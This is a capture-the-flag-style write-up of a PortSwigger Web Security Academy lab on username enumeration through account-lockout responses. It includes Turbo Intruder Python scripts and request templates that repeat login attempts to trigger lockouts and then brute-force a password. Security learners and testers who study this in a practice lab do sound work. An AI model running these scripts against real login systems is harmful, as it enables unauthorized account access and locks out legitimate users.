# Username Enumeration via Account Lock

---

## Lab Description

This PortSwigger Web Security Academy lab demonstrates a **username enumeration vulnerability caused by flawed account-locking logic**.

The application attempts to protect user accounts against brute-force attacks by temporarily locking an account after multiple failed login attempts. However, the difference in responses between valid and invalid usernames allows an attacker to determine whether a username exists.

The lab requires identifying a valid username, brute-forcing its password, and accessing the corresponding account page.

---

## Objective

The objective of this lab is to:

1. Enumerate a valid username.
2. Identify the password associated with that username.
3. Log in to the account.
4. Access the user's account page.

---

## Vulnerability Type

- Username Enumeration
- Broken Brute-Force Protection
- Account Lockout Logic Flaw
- Authentication Vulnerability

---

## Vulnerable Feature

The vulnerable feature is the application's **login and account-locking mechanism**.

After several failed login attempts, a valid account produces an account-lock response:

```text
You have made too many incorrect login attempts.
Please try again in 1 minute(s).
```

This behavior differs from the response for invalid usernames.

Because the response can be distinguished, the account-locking mechanism leaks information about whether a username is valid.

---

## Entry Point

The vulnerability is exposed through the login endpoint:

```http
POST /login
```

Example request structure:

```http
username=wiener&password=iuyt
```

The request was captured using **Burp Suite → Proxy → HTTP History**.

---

## Source

The attacker-controlled input is the username supplied through the login form:

```http
username=<candidate-username>
```

The candidate usernames were taken from the PortSwigger-provided username list.

---

## Sink

The supplied username reaches the application's authentication and account-locking logic.

The resulting authentication response is then returned to the client.

The observable response difference acts as the information leak.

---

## Root Cause

The root cause is **insufficiently uniform authentication behavior**.

The application does not completely hide the difference between:

- an invalid username, and
- a valid username whose account has reached the lockout threshold.

Repeated authentication attempts therefore cause different observable responses.

An attacker can automate login attempts and identify the username that triggers the account-lock message.

---

## Data Flow

```text
Candidate Username
        │
        ▼
   Login Request
        │
        ▼
   /login Endpoint
        │
        ▼
Authentication Logic
        │
        ├── Invalid Username
        │       │
        │       ▼
        │   Normal Error
        │
        └── Valid Username
                │
                ▼
        Failed Attempts Counter
                │
                ▼
          Account Lock
                │
                ▼
     Different Response
                │
                ▼
       Username Enumeration
```

---

## Exploitation Process

### Step 1 — Capture the Login Request

An invalid login was submitted and the request was captured using Burp Suite.

The request was then sent to **Intruder**.

```http
POST /login HTTP/2

username=wiener&password=iuyt
```

---

### Step 2 — Attempt Enumeration with Intruder

The intended attack uses **Cluster Bomb**.

The username was configured as the first payload position:

```http
username=§invalid-username§&password=example§§
```

The second payload position was configured with **Null Payloads**.

The purpose was to repeatedly submit the same username so that valid accounts would eventually trigger the account-lock mechanism.

---

### Step 3 — Troubleshooting the Intruder Attack

The Cluster Bomb attack did not produce the expected request ordering reliably.

A workaround was attempted by duplicating each username five times:

```text
user1
user1
user1
user1
user1
user2
user2
user2
user2
user2
...
```

However, the expected lockout response was still not reliably identified.

Instead of continuing to rely on the problematic request ordering, Turbo Intruder was used to explicitly control the request sequence.

---

### Step 4 — Configure Turbo Intruder

Turbo Intruder was used to programmatically send five consecutive requests for each username.

The request was modified to use the Turbo Intruder `%s` payload position:

```http
username=%s&password=iuyt
```

The following script was used:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=10,
        pipeline=False,
        engine=Engine.BURP2
    )

    usernames = wordlists.clipboard

    for username in usernames:
        username = username.strip()

        for i in range(5):
            engine.queue(target.req, username)


def handleResponse(req, interesting):
    table.add(req)
```

The username list was copied to the clipboard and loaded using:

```python
wordlists.clipboard
```

---

### Step 5 — Analyze the Responses

Most responses had approximately the same length:

```text
3344
```

An anomalous response was eventually observed for:

```text
auto
```

with a response length of approximately:

```text
3396
```

The response contained the account-lock message:

```text
You have made too many incorrect login attempts.
Please try again in 1 minute(s).
```

This identified the valid username:

```text
auto
```

---

### Step 6 — Brute-Force the Password

After identifying the username, the request was changed to:

```http
username=auto&password=%s
```

The PortSwigger candidate password list was then used with Turbo Intruder.

The password was inserted into the `%s` position for each request.

---

### Step 7 — Troubleshoot Response Filtering

Initially, the response handler was configured to display only HTTP `302` responses:

```python
def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)
```

No output appeared.

Instead of assuming that the attack had failed, the response handler was changed to:

```python
def handleResponse(req, interesting):
    table.add(req)
```

This displayed all responses and allowed the successful response to be identified.

The correct password was then discovered.

---

### Step 8 — Log In

The discovered credentials were used to log in:

```text
Username: auto
Password: <discovered password>
```

The application successfully redirected to the account page.

The lab was solved.

---

## Payload

### Username Enumeration

The Turbo Intruder request used:

```http
username=%s&password=iuyt
```

Each username was submitted five times.

### Password Enumeration

The password attack used:

```http
username=auto&password=%s
```

The `%s` placeholder was replaced with each candidate password.

---

## Why the Attack Works

The attack works because the application's account-locking mechanism produces an observable difference for valid usernames.

For an invalid username, repeated login attempts continue to produce the normal authentication error.

For a valid username, repeated failed attempts eventually trigger the account-locking mechanism.

This creates the following distinction:

```text
Invalid Username
      │
      ▼
Normal Login Error


Valid Username
      │
      ▼
Repeated Failed Attempts
      │
      ▼
Account Lock
      │
      ▼
Different Response
```

The attacker can therefore determine which candidate username corresponds to an existing account.

Once a valid username is identified, the password can be brute-forced separately.

---

## Result

The vulnerability was successfully exploited.

```text
Valid Username: auto
Password: <discovered password>

Username Enumeration: ✅
Password Enumeration: ✅
Account Access: ✅
Lab Status: SOLVED ✅
```

---

## Key Learning

- Account-locking mechanisms can unintentionally leak valid usernames.
- Authentication responses should be as uniform as possible.
- Response length can be useful for identifying anomalies during automated testing.
- Response length alone should not be treated as definitive evidence; the response body should also be inspected.
- Burp Intruder is useful for conventional payload-based attacks.
- Turbo Intruder provides greater control when custom request ordering or logic is required.
- Turbo Intruder uses Python to control request generation and response handling.
- The `%s` placeholder allows payload substitution in Turbo Intruder.
- `engine.queue()` can be used to control exactly how requests are generated.
- `handleResponse()` determines which responses are displayed in the results table.
- During troubleshooting, displaying all responses can reveal why a filtered attack appears to produce no results.
- Authentication vulnerabilities often require analyzing both **application behavior and response differences**, rather than relying only on HTTP status codes.

---

## Skills Practiced

- Burp Suite
- Burp Intruder
- Turbo Intruder
- HTTP/2 Request Analysis
- Username Enumeration
- Password Brute-Forcing
- Account Lockout Analysis
- Authentication Testing
- Response Analysis
- Python-based Request Automation
- Web Application Security Testing

---

## References

- [PortSwigger Lab — Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)
- [PortSwigger — Candidate Usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [PortSwigger — Candidate Passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
- [PortSwigger — Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)

---

## Lab Status

**✅ Completed**
